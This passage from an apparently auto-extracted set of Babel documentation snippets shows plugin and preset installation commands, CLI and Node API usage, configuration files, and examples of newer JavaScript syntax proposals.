  "presets": ["@babel/preset-es2017"]
}

----------------------------------------

TITLE: Using @babel/plugin-syntax-function-sent via Babel CLI
DESCRIPTION: Shell command to use the @babel/plugin-syntax-function-sent plugin with Babel CLI for transforming a JavaScript file.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-syntax-function-sent script.js

----------------------------------------

TITLE: Configuring Babel for React JSX Self Transform
DESCRIPTION: JSON configuration for babel.config.json to include the @babel/plugin-transform-react-jsx-self plugin.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-transform-react-jsx-self"]
}

----------------------------------------

TITLE: Configuring Block Scoping Transform Options
DESCRIPTION: Configuration for the transform-es2015-block-scoping plugin that enables throwing errors when closure is required for let/const transformations.

LANGUAGE: json
CODE:
{
  "plugins": [
    ["transform-es2015-block-scoping", {
      "throwIfClosureRequired": true
    }]
  ]
}

----------------------------------------

TITLE: TypeScript 4.7 Constraints for 'infer' Operator
DESCRIPTION: Illustrates TypeScript 4.7's support for constraints on the 'infer' operator in conditional types, allowing more precise type inference.

LANGUAGE: TypeScript
CODE:
type GetColor<T> =
  T extends { color: infer C extends "red" | "pink" }
    ? C
    : "unknown color";

----------------------------------------

TITLE: Using @babel/plugin-syntax-dynamic-import via CLI
DESCRIPTION: Command to use the @babel/plugin-syntax-dynamic-import plugin with Babel CLI.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-syntax-dynamic-import script.js

----------------------------------------

TITLE: Using Numeric Separators with Decimal Literals in JavaScript
DESCRIPTION: Demonstrates how to use numeric separators with decimal literals to improve readability of large numbers.

LANGUAGE: javascript
CODE:
let budget = 1_000_000_000_000;

// What is the value of `budget`? It's 1 trillion!
//
// Let's confirm:
console.log(budget === 10 ** 12); // true

----------------------------------------

TITLE: Implementing Babel Plugin via Node API
DESCRIPTION: JavaScript code showing how to use the minify-flip-comparisons plugin programmatically through the Babel Node API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["minify-flip-comparisons"]
});

----------------------------------------

TITLE: Installing Babel Core and Register Packages
DESCRIPTION: This command installs @babel/register and @babel/core as development dependencies in your project. These packages are essential for setting up Babel in a Node.js environment.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/register @babel/core

----------------------------------------

TITLE: Using @babel/preset-react via Node API
DESCRIPTION: JavaScript code to use @babel/preset-react with Babel's Node API to transform code.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  presets: ["@babel/preset-react"],
});

----------------------------------------

TITLE: Using ES7 Decorators in JavaScript
DESCRIPTION: Shows implementation of function decorators for property descriptors and method binding, enabling elegant composition and metadata decoration.

LANGUAGE: javascript
CODE:
function concat(...args) {
  let sep = args.pop();

  return function(target, key, descriptor) {
    descriptor.initializer = function() {
      return args.map(arg => this[arg]).join(sep);
    }
  }
}

function autobind(target, key, descriptor) {
  var fn = descriptor.value;
  delete descriptor.value;
  delete descriptor.writable;
  descriptor.get = function () {
    var bound = fn.bind(this);
    Object.defineProperty(this, key, {
      configurable: true,
      writable: true,
      value: bound
    });
    return bound;
  };
}

class Person {
  firstName = "Sebastian";
  lastName = "McKenzie";

  @concat("firstName", "lastName", " ") fullName;
  @concat("lastName", "firstName", ", ") formalName;

  @autobind
  getFullName() {
    return `${this.firstName} ${this.lastName}`;
  }
}

assert(new Person().fullName, "Sebastian McKenzie");
assert(new Person().formalName, "McKenzie, Sebastian");
assert(new Person().getFullName.call(null), "Sebastian McKenzie");

----------------------------------------

TITLE: Using Babel Plugin via CLI
DESCRIPTION: Command line instruction for using the nullish coalescing operator syntax plugin with Babel CLI.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-syntax-nullish-coalescing-operator script.js

----------------------------------------

TITLE: Configuring Babel ES2016 Preset via JSON
DESCRIPTION: JSON configuration example showing how to enable the ES2016 preset in a babel.config.json file.

LANGUAGE: json
CODE:
{
  "presets": ["@babel/preset-es2016"]
}

----------------------------------------

TITLE: Transforming Regex Property of Strings in JavaScript
DESCRIPTION: This snippet illustrates how the plugin transforms a regular expression using a property of strings with the 'v' flag to an equivalent regex with the 'u' flag.

LANGUAGE: javascript
CODE:
/^\p{Emoji_Keycap_Sequence}$/v.test("*\uFE0F\u20E3");
// true

LANGUAGE: javascript
CODE:
/^(?:\*️⃣|#️⃣|0️⃣|1️⃣|2️⃣|3️⃣|4️⃣|5️⃣|6️⃣|7️⃣|8️⃣|9️⃣)$/u.test("*\uFE0F\u20E3");
// true

----------------------------------------

TITLE: Using babel-plugin-minify-constant-folding via CLI
DESCRIPTION: This shell command demonstrates how to use the minify-constant-folding plugin with Babel CLI to transform a JavaScript file.

LANGUAGE: Shell
CODE:
babel --plugins minify-constant-folding script.js

----------------------------------------

TITLE: Applying react-display-name Transform via Node.js API
DESCRIPTION: This JavaScript code snippet shows how to use the @babel/plugin-transform-react-display-name plugin programmatically through the Babel Core Node.js API.

LANGUAGE: JavaScript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-react-display-name"],
});

----------------------------------------

TITLE: Configuring Babel with Recast
DESCRIPTION: Example .babelrc configuration for using Recast with Babel for codemods.

LANGUAGE: JavaScript
CODE:
{
  "parserOpts": {
    "parser": "recast"
  },
  "generatorOpts": {
    "generator": "recast"
  }
}

----------------------------------------

TITLE: Configuring Babel for TypeScript Extensions Rewriting
DESCRIPTION: This JSON configuration snippet shows how to set up Babel's TypeScript preset to rewrite import extensions from .ts to .js.

LANGUAGE: json
CODE:
{
  "presets": [
    ["@babel/preset-typescript", {
      "rewriteImportExtensions": true
    }]
  ]
}

----------------------------------------

TITLE: Importing core-js@3 polyfills in main JavaScript file
DESCRIPTION: JavaScript code to import necessary core-js@3 polyfills in the main entry file when using dynamic imports with @babel/preset-env.

LANGUAGE: javascript
CODE:
import "core-js/modules/es.promise";
import "core-js/modules/es.array.iterator";

// ...

----------------------------------------

TITLE: Applying Babel Plugin via Node API
DESCRIPTION: Illustrates how to use the named capturing groups plugin programmatically with Babel's Node API.

LANGUAGE: JavaScript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-named-capturing-groups-regex"],
});

----------------------------------------

TITLE: Babel Minify Plugin Configuration Examples
DESCRIPTION: Various configuration examples showing plugin options and shared settings

LANGUAGE: json
CODE:
{
  "presets": [["minify", {
    "evaluate": false,
    "mangle": true
  }]]
}

LANGUAGE: json
CODE:
{
  "presets": [["minify", {
    "mangle": {
      "exclude": ["ParserError", "NetworkError"]
    }
  }]]
}

LANGUAGE: json
CODE:
{
  "presets": [["minify", {
    "keepFnName": true
  }]]
}

----------------------------------------

TITLE: Comparing ES5 and ES6+ React Component Syntax
DESCRIPTION: Demonstrates the difference in syntax between ES5 and ES6+ when defining React components, highlighting the more concise method declarations in ES6+.

LANGUAGE: JavaScript
CODE:
// The ES5 way
var Photo = React.createClass({
  handleDoubleTap: function(e) { … },
  render: function() { … },
});

LANGUAGE: JavaScript
CODE:
// The ES6+ way
class Photo extends React.Component {
  handleDoubleTap(e) { … }
  render() { … }
}

----------------------------------------

TITLE: Installing Plugin via NPM/Yarn
DESCRIPTION: Command to install the plugin as a development dependency in your project.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-syntax-explicit-resource-management

----------------------------------------

TITLE: Using Babel ES2015 Preset via CLI
DESCRIPTION: Command line instruction for using @babel/preset-es2015 to transform JavaScript files.

LANGUAGE: shell
CODE:
babel script.js --presets @babel/preset-es2015

----------------------------------------

TITLE: Installing @babel/plugin-transform-modules-systemjs via npm
DESCRIPTION: This command installs the @babel/plugin-transform-modules-systemjs plugin as a development dependency using npm.

LANGUAGE: Shell
CODE:
npm install --save-dev @babel/plugin-transform-modules-systemjs

----------------------------------------

TITLE: Using Babel Plugin via Node API in JavaScript
DESCRIPTION: This snippet demonstrates how to use the @babel/plugin-transform-react-constant-elements plugin programmatically via the Babel Node API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-react-constant-elements"],
});

----------------------------------------

TITLE: Using Virtual Methods with jQuery-like Library in JavaScript
DESCRIPTION: Shows how to use the :: operator with a jQuery-like library to chain method calls for DOM manipulation.

LANGUAGE: JavaScript
CODE:
/* ES7 */
// Create bindings for just the methods that we need
let { find, html } = jake;

// Find all the divs with class="myClass", then get all of the
// "p"s and replace their content.
document.querySelectorAll("div.myClass")::find("p")::html("hahaha");

LANGUAGE: JavaScript
CODE:
/* ES6 */
let _val;
_val = document.querySelectorAll("div.myClass");
_val = find.call(_val, "p");
_val = html.call(_val, "hahaha");

----------------------------------------

TITLE: Babelify Configuration in package.json
DESCRIPTION: Defining Babelify transform options in package.json configuration

LANGUAGE: json
CODE:
{
  "transform": [["babelify", { "comments": false }]]
}

----------------------------------------

TITLE: Importing core-js@2 polyfills in main JavaScript file
DESCRIPTION: JavaScript code to import necessary core-js@2 polyfills in the main entry file when using dynamic imports with @babel/preset-env.

LANGUAGE: javascript
CODE:
import "core-js/modules/es6.promise";
import "core-js/modules/es6.array.iterator";

// ...

----------------------------------------

TITLE: Configuring React JSX Source Transform in Babel Config
DESCRIPTION: JSON configuration to enable the plugin in babel.config.json file.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-transform-react-jsx-source"]
}

----------------------------------------

TITLE: Configuring babel-plugin-minify-constant-folding in babel.config.json
DESCRIPTION: This JSON configuration adds the minify-constant-folding plugin to the Babel configuration file.

LANGUAGE: JSON
CODE:
{
  "plugins": ["minify-constant-folding"]
}

----------------------------------------

TITLE: Configuring Babel to use object-super transform plugin
DESCRIPTION: This JSON configuration snippet shows how to include the @babel/plugin-transform-object-super plugin in a Babel configuration file.

LANGUAGE: JSON
CODE:
{
  "plugins": ["@babel/plugin-transform-object-super"]
}

----------------------------------------

TITLE: Installing and Configuring Babel Preset for ES2015
DESCRIPTION: Commands to install the ES2015 preset for Babel and the corresponding .babelrc configuration.

LANGUAGE: Shell
CODE:
$ npm install --save-dev babel-preset-es2015

LANGUAGE: JavaScript
CODE:
{
  "presets": ["es2015"]
}

----------------------------------------

TITLE: CLI Usage Example
DESCRIPTION: Command line usage for applying the plugin to a JavaScript file.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-syntax-explicit-resource-management script.js

----------------------------------------

TITLE: Plugin Configuration in Babel Config
DESCRIPTION: JSON configuration for enabling the plugin in babel.config.json

LANGUAGE: json
CODE:
{
  "plugins": ["transform-undefined-to-void"]
}

----------------------------------------

TITLE: Transforming RegExp with 'i' Modifier in JavaScript
DESCRIPTION: This snippet demonstrates how the plugin transforms a regular expression with the 'i' (case-insensitive) inline modifier. It converts the modifier to an equivalent character set.

LANGUAGE: javascript
CODE:
// matches Aa and aa
const regex = /(?i:a)a/

LANGUAGE: javascript
CODE:
const regex = /(?:[Aa])a/

----------------------------------------

TITLE: Configuring Babel Plugin with Options in JSON
DESCRIPTION: This snippet demonstrates how to configure the plugin with the 'allowMutablePropsOnTags' option in the Babel configuration file.

LANGUAGE: json
CODE:
{
  "plugins": [
    [
      "@babel/plugin-transform-react-constant-elements",
      { "allowMutablePropsOnTags": ["FormattedMessage"] }
    ]
  ]
}

----------------------------------------

TITLE: Implementing Mallet Operator in JavaScript
DESCRIPTION: Demonstrates the usage of the Mallet operator, a new playground feature that allows conditional assignment based on falsy-ness, similar to Ruby and CoffeeScript.

LANGUAGE: JavaScript
CODE:
a ||= b

LANGUAGE: JavaScript
CODE:
if (!a) a = b;

----------------------------------------

TITLE: Configuring Babel Connect Middleware
DESCRIPTION: Shows how to set up babel-connect middleware to transform JavaScript files from an assets directory to a cache directory. The middleware is configured with transformation options and integrated with the static file serving middleware.

LANGUAGE: javascript
CODE:
var babelMiddleware = require("babel-connect");

app.use(babelMiddleware({
  options: {
    // options to use when transforming files
  },
  src: "assets",
  dest: "cache"
}));

app.use(connect.static("cache"));

----------------------------------------

TITLE: Installing Export Default From Plugin
DESCRIPTION: NPM installation command for adding the plugin to a project's development dependencies.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-proposal-export-default-from

----------------------------------------

TITLE: Using React JSX Compat Plugin via Babel CLI
DESCRIPTION: This shell command demonstrates how to use the @babel/plugin-transform-react-jsx-compat plugin with the Babel CLI to transform a JavaScript file.

LANGUAGE: Shell
CODE:
babel --plugins @babel/plugin-transform-react-jsx-compat script.js

----------------------------------------

TITLE: Using External Helpers via CLI
DESCRIPTION: Command line interface usage for applying the external helpers plugin to a JavaScript file.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-external-helpers script.js

----------------------------------------

TITLE: Running Babel Doctor
DESCRIPTION: Example output of running the babel-doctor command which checks for common issues like missing .babelrc, duplicate Babel modules, and outdated packages.

LANGUAGE: sh
CODE:
$ babel-doctor

Babel Doctor
Running sanity checks on your system. This may take a few minutes...

✔ Found config at /Users/sebastian/.babelrc
✔ All babel packages appear to be up to date
✔ No duplicate babel packages found

Everything looks all right!


----------------------------------------

TITLE: Installing Babel Plugin for Logical Assignment Operators Syntax via npm/yarn
DESCRIPTION: Command to install the @babel/plugin-syntax-logical-assignment-operators plugin using npm or yarn package managers.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-syntax-logical-assignment-operators

----------------------------------------

TITLE: Node API Usage - JavaScript
DESCRIPTION: Example of using the plugin programmatically via the Node.js API with @babel/core.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-unicode-escapes"],
});

----------------------------------------

TITLE: Installing @babel/plugin-transform-flow-strip-types via npm
DESCRIPTION: Shows the command to install the Babel plugin using npm.

LANGUAGE: Shell
CODE:
npm install --save-dev @babel/plugin-transform-flow-strip-types

----------------------------------------

TITLE: Using @babel/plugin-transform-parameters via Node API
DESCRIPTION: This JavaScript snippet shows how to use the @babel/plugin-transform-parameters plugin programmatically with the Babel Core API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-parameters"],
});

----------------------------------------

TITLE: Installing ECMAScript Package in Meteor
DESCRIPTION: Command to add ECMAScript support to a Meteor project. This package enables modern JavaScript features through Babel compilation, though it's already included by default in Meteor 1.2 and newer versions.

LANGUAGE: sh
CODE:
meteor add ecmascript

----------------------------------------

TITLE: Running Lab Tests with Babel Transpiler in Shell
DESCRIPTION: This command configures the Lab test runner to use the lab-babel transpiler, enabling Babel support for running tests. It specifies the path to the lab-babel module in the node_modules directory.

LANGUAGE: sh
CODE:
lab -T node_modules/lab-babel

----------------------------------------

TITLE: Babel 6 Basic Configuration
DESCRIPTION: Basic Babel configuration file showing preset configuration for environment, React, and stage-2 features.

LANGUAGE: json
CODE:
{
  "presets": ["env", "react", "stage-2"]
}

----------------------------------------

TITLE: Using Duplicate Named Capturing Groups in Babel 7.19.0
DESCRIPTION: Transform support for the duplicate named capturing groups Stage 3 proposal.

LANGUAGE: JavaScript
CODE:
/(?<year>\d\d\d\d)-(?<month>\d\d)|(?<month>\d\d)-(?<year>\d\d\d\d)/

----------------------------------------

TITLE: Installing @babel/preset-flow
DESCRIPTION: Command for installing the Flow preset using npm package manager.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/preset-flow

----------------------------------------

TITLE: Configuring remove-console Babel Plugin without Options
DESCRIPTION: Demonstrates how to configure the remove-console plugin in a Babel configuration file without any options.

LANGUAGE: JSON
CODE:
{
  "plugins": ["transform-remove-console"]
}

----------------------------------------

TITLE: Using Spec Option in Class Properties Transform
DESCRIPTION: Shows how to use the new 'spec' option in the class properties transform plugin, which uses Object.defineProperty for more spec-compliant behavior.

LANGUAGE: JavaScript
CODE:
{
  "plugins": [
    ["transform-class-properties", {
      "spec": true
    }]
  ]
}

----------------------------------------

TITLE: Installing Babel Optional Chaining Syntax Plugin
DESCRIPTION: Command to install the @babel/plugin-syntax-optional-chaining plugin as a development dependency using npm.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-syntax-optional-chaining

----------------------------------------

TITLE: Node.js API Integration
DESCRIPTION: Example of using the plugin programmatically through the Babel Node.js API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["transform-simplify-comparison-operators"],
});

----------------------------------------

TITLE: Plugin Installation Command
DESCRIPTION: NPM command to install the function name transform plugin as a dev dependency.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-transform-function-name

----------------------------------------

TITLE: Error Handling with Babel Parser
DESCRIPTION: Example showing how to handle parsing errors using error codes and error recovery

LANGUAGE: JavaScript
CODE:
const { parse } = require("@babel/parser");

const ast = parse(`a b`, { errorRecovery: true });

console.log(ast.errors[0].code); // BABEL_PARSER_SYNTAX_ERROR
console.log(ast.errors[0].reasonCode); // MissingSemicolon

----------------------------------------

TITLE: Advanced Babel Configuration with Literals Transform
DESCRIPTION: Extended Babel configuration combining numeric separator plugin with literals transform and preset-env.

LANGUAGE: json
CODE:
{
  "presets": ["@babel/preset-env"],
  "plugins": ["@babel/plugin-transform-numeric-separator"]
}
{
  "plugins": ["@babel/plugin-transform-numeric-separator", "@babel/plugin-transform-literals"]
}

----------------------------------------

TITLE: Transpiling JavaScript with Babel in C# using ReactEnvironment
DESCRIPTION: This snippet demonstrates how to use Babel within a C# environment to transpile JavaScript. It shows two methods: transpiling a file and transpiling a code string directly. The code uses the ReactEnvironment.Current.Babel object to access Babel functionality.

LANGUAGE: csharp
CODE:
var babel = ReactEnvironment.Current.Babel;
// Transpiles a file
// You can instead use `TransformFileWithSourceMap` if you want a source map too.
var result = babel.TransformFile("foo.js");
// Transpiles a piece of code
var result = babel.Transform("class Foo { }");

----------------------------------------

TITLE: Installing jstransformer-babel via npm or yarn
DESCRIPTION: This command installs the jstransformer-babel package, which is a Babel transformer for JSTransformer. It supports Babel 6 only.

LANGUAGE: shell
CODE:
npm install jstransformer-babel

----------------------------------------

TITLE: Using Explicit Resource Management in Babel 7.20.0
DESCRIPTION: Parser support for the explicit resource management Stage 2 proposal.

LANGUAGE: JavaScript
CODE:
{
  using handle = openFile(name, "w+");
  write(handle, "Hi!\n");
  write(handle, ":)\n");
} // Automatically close the file

----------------------------------------

TITLE: CLI Usage Example
DESCRIPTION: Command line usage example showing how to use the plugin with Babel CLI.

LANGUAGE: shell
CODE:
babel --plugins transform-remove-debugger script.js

----------------------------------------

TITLE: Using Babel Plugin via CLI
DESCRIPTION: Command line usage of the shorthand properties transform plugin.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-transform-shorthand-properties script.js

----------------------------------------

TITLE: Enabling Flow Comma Separator in Babel Generator
DESCRIPTION: Shows how to enable the 'flowCommaSeparator' option in Babel generator for using commas in Flow object types.

LANGUAGE: JavaScript
CODE:
{
  "generatorOpts": {
    "flowCommaSeparator": true // defaults to false
  }
}

----------------------------------------

TITLE: Configuring Webpack entry with core-js@3 polyfills
DESCRIPTION: JavaScript configuration for Webpack to include necessary core-js@3 polyfills when using dynamic imports with @babel/preset-env.

LANGUAGE: javascript
CODE:
const config = {
  entry: [
    "core-js/modules/es.promise",
    "core-js/modules/es.array.iterator",
    path.resolve(__dirname, "src/main.js"),
  ],
  // ...
};

----------------------------------------

TITLE: Plugin Installation Command
DESCRIPTION: NPM command to install the block-scoping transform plugin as a development dependency.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-transform-block-scoping

----------------------------------------

TITLE: Installing Top Level Await Plugin
DESCRIPTION: NPM command to install the @babel/plugin-syntax-top-level-await plugin as a development dependency.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-syntax-top-level-await

----------------------------------------

TITLE: Using transform-minify-booleans Plugin via Babel CLI
DESCRIPTION: Shows the command to use the plugin with Babel CLI for transforming a JavaScript file.

LANGUAGE: Shell
CODE:
babel --plugins transform-minify-booleans script.js

----------------------------------------

TITLE: Using transform-minify-booleans Plugin via Babel CLI
DESCRIPTION: Shows the command to use the plugin with Babel CLI for transforming a JavaScript file.

LANGUAGE: Shell
CODE:
babel --plugins transform-minify-booleans script.js

----------------------------------------

TITLE: Installing Babel Connect Package
DESCRIPTION: Command to install the babel-connect package using npm or yarn package managers. The npm2yarn annotation indicates this command can be automatically converted between npm and yarn formats.

LANGUAGE: shell
CODE:
npm install babel-connect

----------------------------------------

TITLE: Configuring and Executing Babel Transpilation Task with @start Plugins in JavaScript
DESCRIPTION: This snippet imports necessary @start plugins, defines a Babel configuration object, and exports a task function. The task finds JavaScript files in the 'src' directory, reads them, applies Babel transpilation, and writes the output to the 'build' directory. It utilizes the sequence plugin to chain these operations.

LANGUAGE: JavaScript
CODE:
import sequence from '@start/plugin-sequence'
import find from '@start/plugin-find'
import read from '@start/plugin-read'
import babel from '@start/plugin-lib-babel'
import write from '@start/plugin-write'

const babelConfig = {
  // …
  babelrc: false,
  sourceMap: true,
}

export const task = () =>
  sequence(
    find('src/**/*.js'),
    read,
    babel(babelConfig),
    write('build/')
  )

----------------------------------------

TITLE: Using Import Reflection in Babel 7.20.0
DESCRIPTION: Parser support for the import reflection Stage 2 proposal.

LANGUAGE: JavaScript
CODE:
import module mod from "./mod.js";

// later ...
import(mod);

----------------------------------------

TITLE: Babelify Node.js API with Options
DESCRIPTION: Configuring Babelify options using the Node.js API

LANGUAGE: javascript
CODE:
browserify().transform(babelify.configure({
  comments: false
}))

----------------------------------------

TITLE: Babel Node Usage Pattern
DESCRIPTION: Basic usage pattern for babel-node CLI

LANGUAGE: shell
CODE:
babel-node [options] [ -e script | [--] script.js ] [arguments]

----------------------------------------

TITLE: Configuring Babel Plugin in Configuration File
DESCRIPTION: JSON configuration for enabling the async do expressions syntax plugin in babel.config.json.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-syntax-async-do-expressions"]
}

----------------------------------------

TITLE: Configuring Babel Presets with Environment-Specific Options
DESCRIPTION: Demonstrates how to configure Babel presets with different options for specific environments using the 'env' option in .babelrc.

LANGUAGE: JavaScript
CODE:
{
  presets: [
    ['env', { modules: false}],
  ],
  env: {
    test: {
      presets: [
         'env'
      ],
    }
  },
}

----------------------------------------

TITLE: Installing @babel/preset-stage-0 via npm
DESCRIPTION: Command to install the @babel/preset-stage-0 package as a development dependency using npm or yarn.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/preset-stage-0

----------------------------------------

TITLE: Configuring Babel to Use Unicode Sets Regex Syntax Plugin
DESCRIPTION: This JSON configuration adds the @babel/plugin-syntax-unicode-sets-regex plugin to the Babel configuration file.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-syntax-unicode-sets-regex"]
}

----------------------------------------

TITLE: Using Deferred Import Evaluation in JavaScript
DESCRIPTION: This snippet demonstrates the new Deferred Import Evaluation proposal, allowing deferral of module evaluation until usage.

LANGUAGE: javascript
CODE:
// this line does not evaluate ./mod
import defer * as myMod from "./mod";


later(() => {
  // this one evaluates it!
  use(myMod.foo);
})

----------------------------------------

TITLE: Adding Named Import with Hint
DESCRIPTION: Demonstrates adding a named import with a custom hint name using addNamed function.

LANGUAGE: javascript
CODE:
import { addNamed } from "@babel/helper-module-imports";
addNamed(path, 'named', 'source', { nameHint: "hintedName" });

----------------------------------------

TITLE: Installing Babel Plugin for Brunch using npm
DESCRIPTION: This command installs the babel-brunch plugin as a development dependency in a Node.js project. It allows Brunch to use Babel for transpiling JavaScript code.

LANGUAGE: shell
CODE:
npm install --save-dev babel-brunch

----------------------------------------

TITLE: Installing @babel/compat-data with npm or yarn
DESCRIPTION: This command installs the @babel/compat-data package as a development dependency using npm or yarn.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/compat-data

----------------------------------------

TITLE: Using Class Static Blocks in Babel 7.12.0
DESCRIPTION: Support for the class static blocks proposal.

LANGUAGE: JavaScript
CODE:
class A {
  static { initialize(A); }
}

----------------------------------------

TITLE: Using Babel Plugin via Node API in JavaScript
DESCRIPTION: Demonstrates how to use the plugin programmatically through Babel's Node.js API.

LANGUAGE: JavaScript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-for-of"],
});

----------------------------------------

TITLE: Configuring Babel for Partial Application Plugin
DESCRIPTION: JSON configuration to enable the partial application plugin in Babel.

LANGUAGE: JSON
CODE:
{
  "plugins": ["@babel/plugin-proposal-partial-application"]
}

----------------------------------------

TITLE: Running Babel Upgrade Tool
DESCRIPTION: Command to run the babel-upgrade tool to automatically update Babel 6 configs to Babel 7 format.

LANGUAGE: Shell
CODE:
npx babel-upgrade --write --install

----------------------------------------

TITLE: Using @babel/preset-stage-1 via Babel CLI
DESCRIPTION: Command to use @babel/preset-stage-1 when transpiling a JavaScript file using the Babel CLI.

LANGUAGE: shell
CODE:
babel script.js --presets @babel/preset-stage-1

----------------------------------------

TITLE: Using @babel/plugin-syntax-optional-chaining-assign via Babel CLI
DESCRIPTION: Shell command to use the @babel/plugin-syntax-optional-chaining-assign plugin with Babel CLI for transforming JavaScript files.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-syntax-optional-chaining-assign script.js

----------------------------------------

TITLE: Using Unicode Regex Transform Plugin via Babel CLI
DESCRIPTION: This shell command demonstrates how to use the @babel/plugin-transform-unicode-regex plugin with Babel CLI to transform a JavaScript file.

LANGUAGE: Shell
CODE:
babel --plugins @babel/plugin-transform-unicode-regex script.js

----------------------------------------

TITLE: Node.js API Usage Example
DESCRIPTION: Example of using the plugin programmatically via the Node.js API

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: [
    "@babel/plugin-transform-dynamic-import",
    "@babel/plugin-transform-modules-systemjs"
  ],
});

----------------------------------------

TITLE: Using @babel/standalone Package Reference
DESCRIPTION: Reference to the @babel/standalone package that can be used as a precompiled version of Babel in browser environments.

LANGUAGE: javascript
CODE:
@babel/standalone

----------------------------------------

TITLE: Importing Plugin Compatibility Data in JavaScript
DESCRIPTION: This snippet demonstrates how to import and use the plugins compatibility data from @babel/compat-data in a Babel plugin file.

LANGUAGE: javascript
CODE:
import _plugins from "@babel/compat-data/plugins";
const pluginsCompatData = _plugins.default;

----------------------------------------

TITLE: Using Static Private Accessors in Babel 7.6.0
DESCRIPTION: Support for static private accessors, part of the static class features proposal.

LANGUAGE: JavaScript
CODE:
class Dog {
  static get #className() { return "Dog"; }
}

----------------------------------------

TITLE: Printing Babel Configuration using Environment Variable
DESCRIPTION: Command to print the effective Babel configuration for a specific file using the new BABEL_SHOW_CONFIG_FOR environment variable.

LANGUAGE: Shell
CODE:
# *nix or WSL
BABEL_SHOW_CONFIG_FOR=./src/myComponent.jsx npm start

LANGUAGE: PowerShell
CODE:
$env:BABEL_SHOW_CONFIG_FOR = ".\src\myComponent.jsx"; npm start

----------------------------------------

TITLE: Replacing top-level 'this' with 'globalThis' using environmentVisitor
DESCRIPTION: Babel plugin example that replaces top-level 'this' with 'globalThis' using environmentVisitor to handle complex cases involving class methods and computed properties.

LANGUAGE: javascript
CODE:
import environmentVisitor from "@babel/helper-environment-visitor";

module.exports = (api) => {
  const { types: t, traverse } = api;
  return {
    name: "replace-top-level-this",
    visitor: traverse.visitors.merge([
      {
        ThisExpression(path) {
          path.replaceWith(t.identifier("globalThis"));
        }
      },
      environmentVisitor
    ]);
  }
}

----------------------------------------

TITLE: Invalid Partial Application Usage in JavaScript
DESCRIPTION: Shows examples of invalid partial application syntax, including usage in expressions, new operators, and super calls.

LANGUAGE: JavaScript
CODE:
f(x + ?)          // `?` not in top-level Arguments of call
x + ?             // `?` not in top-level Arguments of call
?.f()             // `?` not in top-level Arguments of call
new f(?)          // `?` not supported in `new`
super(?)          // `?` not supported in |SuperCall|

----------------------------------------

TITLE: Babel Parser Decorator Configuration
DESCRIPTION: Configuration example for using decorators in Babel's parser with the decoratorsBeforeExport option

LANGUAGE: javascript
CODE:
const ast = babylon.parse(code, {
  plugins: [
    ["decorators", { decoratorsBeforeExport: true }]
  ]
})

----------------------------------------

TITLE: Applying @babel/preset-stage-2 using Babel Node API
DESCRIPTION: JavaScript code to apply @babel/preset-stage-2 when transforming code using the Babel Core API in a Node.js environment.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  presets: ["@babel/preset-stage-2"]
});

----------------------------------------

TITLE: Using Optional Chaining Plugin via CLI
DESCRIPTION: Command line usage of the optional chaining syntax plugin with the Babel CLI.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-syntax-optional-chaining script.js

----------------------------------------

TITLE: Using SystemJS Transform Plugin via Babel CLI
DESCRIPTION: This shell command demonstrates how to use the @babel/plugin-transform-modules-systemjs plugin with Babel CLI to transform a JavaScript file.

LANGUAGE: Shell
CODE:
babel --plugins @babel/plugin-transform-modules-systemjs script.js

----------------------------------------

TITLE: Using environmentVisitor to collect await expressions in async functions
DESCRIPTION: Babel plugin example demonstrating the use of environmentVisitor to collect await expressions within async functions while skipping nested arrow functions.

LANGUAGE: javascript
CODE:
module.exports = (api) => {
  const { types: t, traverse } = api;
  return {
    name: "collect-await",
    visitor: {
      Function(path) {
        if (path.node.async) {
          const awaitExpressions = [];
          // Get a list of related await expressions within the async function body
          path.traverse(traverse.visitors.merge([
            environmentVisitor,
            {
              AwaitExpression(path) {
                awaitExpressions.push(path);
              },
              ArrowFunctionExpression(path) {
                path.skip();
              },
            }
          ]))
        }
      }
    }
  }
}

----------------------------------------

TITLE: Transforming Regex with /s Flag in JavaScript
DESCRIPTION: This snippet demonstrates how the plugin transforms a regular expression with the /s flag. It converts /./s to /[\0-\uFFFF]/.

LANGUAGE: JavaScript
CODE:
/./s;

LANGUAGE: JavaScript
CODE:
/[\0-\uFFFF]/;

----------------------------------------

TITLE: Updating TSTemplateLiteralType AST in Babel 8
DESCRIPTION: The AST structure for TypeScript template literal types has changed in Babel 8. A new TSTemplateLiteralType node is created for interpolated template literal types.

LANGUAGE: typescript
CODE:
